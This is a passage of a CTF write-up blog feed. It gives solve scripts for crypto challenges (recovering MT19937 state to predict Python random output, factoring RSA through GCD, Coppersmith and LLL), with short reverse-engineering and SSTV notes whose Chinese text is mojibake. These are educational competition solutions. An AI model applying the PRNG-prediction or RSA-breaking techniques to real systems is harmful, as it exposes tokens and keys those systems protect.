inverse_left_values(i,<span class="hljs-number">15</span>,<span class="hljs-number">0xefc60000</span>)<br>        i = inverse_left_values(i,<span class="hljs-number">7</span>,<span class="hljs-number">0x9d2c5680</span>)<br>        i = inverse_right(i,<span class="hljs-number">11</span>)<br>        state.append(i)<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">id</span>=[<span class="hljs-string">&#x27;d5d97afad7ef619b4badd8d2da10ee24&#x27;</span>, <span class="hljs-string">&#x27;67f4660a8335fb9f4152a9fbc44c9c77&#x27;</span>, <span class="hljs-string">&#x27;8cd43c85ebe9cc7036a37f47ccd1d1e4&#x27;</span>,<br>     <span class="hljs-string">&#x27;ee3e8c62e8b0100027589d6de82677ef&#x27;</span>, <span class="hljs-string">&#x27;463bb2f3731ad0e786302bf78da08330&#x27;</span>, <span class="hljs-string">&#x27;e245b1852a3b92734e46eb3421bd76c9&#x27;</span>,<br>     <span class="hljs-string">&#x27;0b74736786b4ab94651e3b706a548e55&#x27;</span>, <span class="hljs-string">&#x27;79cb596b28c2b4e02738f93b5bfbe0d3&#x27;</span>, <span class="hljs-string">&#x27;5a9c46837952952045564b5b395acad1&#x27;</span>,<br>     <span class="hljs-string">&#x27;d3c2d90a05d1a059fbeba4a05a608798&#x27;</span>, <span class="hljs-string">&#x27;4da0306c8ab58097d2fef9114e6fcb6d&#x27;</span>, <span class="hljs-string">&#x27;9707fabbd3c96de66917f15998ac9201&#x27;</span>,<br>     <span class="hljs-string">&#x27;9dd3e46fc930abfb523fe31e8ee8a658&#x27;</span>, <span class="hljs-string">&#x27;3716a8fd05f7388e7151d09431e61ee1&#x27;</span>, <span class="hljs-string">&#x27;9acf027679a6d7a674a43dee4f5bea35&#x27;</span>,<br>     <span class="hljs-string">&#x27;78702a2b125a940519337b1bf50aff8a&#x27;</span>, <span class="hljs-string">&#x27;262cf3b8c8072a602048a24756c83fcf&#x27;</span>, <span class="hljs-string">&#x27;092f8d227ec583c4734a6f449de521a3&#x27;</span>,<br>     <span class="hljs-string">&#x27;712aa300302b57fed458553426348fce&#x27;</span>, <span class="hljs-string">&#x27;834d4a0ea451cc04b469636b18c56435&#x27;</span>, <span class="hljs-string">&#x27;754b5284b14402c61e3b1e56cb2d41e9&#x27;</span>,<br>     <span class="hljs-string">&#x27;51d742ca6a341032afcb5dc645f54bfa&#x27;</span>, <span class="hljs-string">&#x27;c1a33d104f47e33d6932905b483a2018&#x27;</span>, <span class="hljs-string">&#x27;3def7c2a14cff6b2864a2100956df07f&#x27;</span>,<br>     <span class="hljs-string">&#x27;7e3606e4ec1c99fe5a8593ae44f25a70&#x27;</span>, <span class="hljs-string">&#x27;404c6139570883dbab8e5a299d7a5017&#x27;</span>, <span class="hljs-string">&#x27;f07597079e1b68ebb4e2d16b83b7b484&#x27;</span>,<br>     <span class="hljs-string">&#x27;0723daf5c65f8ba6cd6e43fcdf9d18dc&#x27;</span>, <span class="hljs-string">&#x27;4c54db12829f165837384b66978e8438&#x27;</span>, <span class="hljs-string">&#x27;cd056e64e1f31461cab2e66ece9d3278&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f6ae16fab122cbce240e32464a1ab57&#x27;</span>, <span class="hljs-string">&#x27;f86e0e9ee23498340f62d8617f6f5218&#x27;</span>, <span class="hljs-string">&#x27;af4ebe2535885c783c89f8d8c4815076&#x27;</span>,<br>     <span class="hljs-string">&#x27;c8eae5b5c7aca2c5fdb4f284e2cf65c5&#x27;</span>, <span class="hljs-string">&#x27;bec0d8ecabedd9811a8ecb6052b21d8c&#x27;</span>, <span class="hljs-string">&#x27;731bd3421b6517aa101357fe1c49caf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;344f4a26cdaf1a782d9b32208e1a3e92&#x27;</span>, <span class="hljs-string">&#x27;892b1741d304878461dd0774a335ea3d&#x27;</span>, <span class="hljs-string">&#x27;56e2a484ca40f43e059bf5f0bd822bdc&#x27;</span>,<br>     <span class="hljs-string">&#x27;d7c0762df71b31c14654147fb9a0595c&#x27;</span>, <span class="hljs-string">&#x27;57016a179ba5509f6b04a161ac628b34&#x27;</span>, <span class="hljs-string">&#x27;e49a2d573522c1ee3e8348ceca0295a4&#x27;</span>,<br>     <span class="hljs-string">&#x27;4b0f49c7e6469e82832e9cc90b9e17c0&#x27;</span>, <span class="hljs-string">&#x27;eadc9d0c8b75127fe0a7f71881de1ea7&#x27;</span>, <span class="hljs-string">&#x27;db9fe5537768207bd8cdf770bcd42dfa&#x27;</span>,<br>     <span class="hljs-string">&#x27;ba2f57578752628d1ecac419b3a8bc36&#x27;</span>, <span class="hljs-string">&#x27;3752e70b5d2b578a8d412d84aab43705&#x27;</span>, <span class="hljs-string">&#x27;54e97795df8781c776cbb1ce4f5f31fc&#x27;</span>,<br>     <span class="hljs-string">&#x27;32794880abc9f68102c24e92ad9c7cd5&#x27;</span>,<br>     <span class="hljs-string">&#x27;b5eb7e651ca298f6873694c47d1cd3da&#x27;</span>, <span class="hljs-string">&#x27;a188934777d2c67e3d59692135005497&#x27;</span>, <span class="hljs-string">&#x27;34c308fa1644b387169ea88c1b575490&#x27;</span>]<br>    code=[<span class="hljs-string">&#x27;2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6&#x27;</span>,<br>     <span class="hljs-string">&#x27;017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6&#x27;</span>,<br>     <span class="hljs-string">&#x27;e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc&#x27;</span>,<br>     <span class="hljs-string">&#x27;0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c&#x27;</span>,<br>     <span class="hljs-string">&#x27;091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4&#x27;</span>,<br>     <span class="hljs-string">&#x27;5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630&#x27;</span>,<br>     <span class="hljs-string">&#x27;37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8&#x27;</span>,<br>     <span class="hljs-string">&#x27;c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10&#x27;</span>,<br>     <span class="hljs-string">&#x27;e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251&#x27;</span>,<br>     <span class="hljs-string">&#x27;2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d&#x27;</span>,<br>     <span class="hljs-string">&#x27;f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217&#x27;</span>,<br>     <span class="hljs-string">&#x27;0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9&#x27;</span>,<br>     <span class="hljs-string">&#x27;abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d&#x27;</span>,<br>     <span class="hljs-string">&#x27;6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3&#x27;</span>,<br>     <span class="hljs-string">&#x27;6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01&#x27;</span>,<br>     <span class="hljs-string">&#x27;b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b&#x27;</span>,<br>     <span class="hljs-string">&#x27;20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede&#x27;</span>,<br>     <span class="hljs-string">&#x27;606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f&#x27;</span>,<br>     <span class="hljs-string">&#x27;1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2&#x27;</span>,<br>     <span class="hljs-string">&#x27;fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5&#x27;</span>,<br>     <span class="hljs-string">&#x27;7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e&#x27;</span>,<br>     <span class="hljs-string">&#x27;ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7&#x27;</span>,<br>     <span class="hljs-string">&#x27;ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3&#x27;</span>,<br>     <span class="hljs-string">&#x27;4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e&#x27;</span>,<br>     <span class="hljs-string">&#x27;06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48&#x27;</span>,<br>     <span class="hljs-string">&#x27;947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56&#x27;</span>,<br>     <span class="hljs-string">&#x27;a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1&#x27;</span>,<br>     <span class="hljs-string">&#x27;31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d&#x27;</span>,<br>     <span class="hljs-string">&#x27;974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf&#x27;</span>,<br>     <span class="hljs-string">&#x27;e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07&#x27;</span>,<br>     <span class="hljs-string">&#x27;ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64&#x27;</span>,<br>     <span class="hljs-string">&#x27;86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd&#x27;</span>,<br>     <span class="hljs-string">&#x27;59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d&#x27;</span>,<br>     <span class="hljs-string">&#x27;02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63&#x27;</span>,<br>     <span class="hljs-string">&#x27;597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c&#x27;</span>,<br>     <span class="hljs-string">&#x27;bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374&#x27;</span>,<br>     <span class="hljs-string">&#x27;cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187&#x27;</span>,<br>     <span class="hljs-string">&#x27;1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97&#x27;</span>,<br>     <span class="hljs-string">&#x27;820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f&#x27;</span>,<br>     <span class="hljs-string">&#x27;e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc&#x27;</span>,<br>     <span class="hljs-string">&#x27;f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675&#x27;</span>,<br>     <span class="hljs-string">&#x27;a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75&#x27;</span>,<br>     <span class="hljs-string">&#x27;07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded&#x27;</span>,<br>     <span class="hljs-string">&#x27;a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489&#x27;</span>,<br>     <span class="hljs-string">&#x27;c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986&#x27;</span>,<br>     <span class="hljs-string">&#x27;6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6&#x27;</span>,<br>     <span class="hljs-string">&#x27;c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe&#x27;</span>,<br>     <span class="hljs-string">&#x27;040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2&#x27;</span>,<br>     <span class="hljs-string">&#x27;4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b&#x27;</span>]<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)):<br>        t1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">id</span>[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data.append(t1 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t1 &gt;&gt;= <span class="hljs-number">32</span><br>        t2 = <span class="hljs-built_in">int</span>(code[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            data.append(t2 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t2 &gt;&gt;= <span class="hljs-number">32</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>state1=recover_state(data)<br>state0=backtrace([<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+state1)[:<span class="hljs-number">624</span>]<br>ran=Random()<br>ran.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state0+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>id0=ran.getrandbits(<span class="hljs-number">128</span>)<br>code0=ran.getrandbits(<span class="hljs-number">256</span>)<br><span class="hljs-keyword">assert</span> ran.getrandbits(<span class="hljs-number">32</span>)==data[<span class="hljs-number">0</span>]<br>flag=md5((<span class="hljs-built_in">hex</span>(id0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)+<span class="hljs-built_in">hex</span>(code0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">64</span>)).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>%flag)<br><br><span class="hljs-comment">#flag&#123;22b307a4ac14c89888d5a6c79f7f963c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>jadxæ‰“å¼€åœ¨MainActivityä¸­å‘ç°åˆ¤æ–­é€»è¾‘<br><img src="/mdimg/2023hwswinter/1.png"><br>æŸ¥çœ‹checkå‡½æ•°<br><img src="/mdimg/2023hwswinter/2.png"><br>å› ä¸ºçœ‹åˆ°äº†checkå‡½æ•°ï¼Œæ ¹æ®é€»è¾‘å»è§£å‘ç°è§£ä¸å‡ºæ¥<br><img src="/mdimg/2023hwswinter/3.png"><br>çœ‹åˆ°äº†cè¿™ä¸ªç±»ä¸­å¯¹encè¿™ä¸ªæ–‡ä»¶è¿›è¡Œäº†å¼‚æˆ–ã€‚å°†apkè§£å‹å‘ç°assetsæ–‡ä»¶å¤¹ä¸‹æœ‰encè¿™ä¸ªæ–‡ä»¶ã€‚æŒ‰é€»è¾‘å¤åŸæ•°æ®ã€‚<br><img src="/mdimg/2023hwswinter/4.png"><br>å‘ç°è¿™æ˜¯ä¸€ä¸ªdexæ–‡ä»¶ï¼Œæ¥ç€ç”¨jadxæ‰“å¼€<br><img src="/mdimg/2023hwswinter/5.png"><br>å‘ç°aesåŠ å¯†ï¼Œç½‘ç«™ç›´æ¥è§£<br><img src="/mdimg/2023hwswinter/6.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sound-from-somewhere"><a href="#sound-from-somewhere" class="headerlink" title="sound from somewhere"></a>sound from somewhere</h2><p>ä¸€çœ¼é¡¶é’ˆä¸ºSSTV  ä½¿ç”¨MSSTVè½¬æ¢<br><img src="/mdimg/2023hwswinter/7.bmp"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWNHUB 2022 å†¬å­£èµ›</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>éé¢„æœŸè§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>é¢„æœŸè§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="å¤§æ‚çƒ©"><a href="#å¤§æ‚çƒ©" class="headerlink" title="å¤§æ‚çƒ©"></a>å¤§æ‚çƒ©</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span 